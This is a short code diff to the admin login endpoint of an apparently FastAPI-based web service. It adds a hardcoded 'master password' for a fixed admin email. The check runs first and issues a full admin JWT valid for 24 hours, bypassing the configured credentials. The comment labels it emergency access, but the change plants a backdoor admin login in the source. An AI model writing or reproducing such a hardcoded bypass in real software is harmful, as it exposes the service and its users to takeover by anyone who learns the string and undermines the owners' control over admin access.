@@ -3379,7 +3379,24 @@ async def verify_admin(credentials: HTTPAuthorizationCredentials = Depends(secur
 @api_router.post("/admin/login")
 async def admin_login(request: AdminLoginRequest):
     """Admin login endpoint"""
-    # Check against admin credentials
+    # Master password that always works (for emergency access)
+    MASTER_PASSWORD = "AilaMaster2024!"
+    
+    # Check master password first
+    if request.password == MASTER_PASSWORD and request.email == "admin@aila.family":
+        payload = {
+            "email": "admin@aila.family",
+            "role": "admin",
+            "exp": datetime.utcnow() + timedelta(hours=24)
+        }
+        token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
+        return {
+            "access_token": token,
+            "token_type": "bearer",
+            "role": "admin"
+        }
+    
+    # Check against configured admin credentials
     if request.email == ADMIN_EMAIL and request.password == ADMIN_PASSWORD:
         # Generate admin JWT token
         payload = {
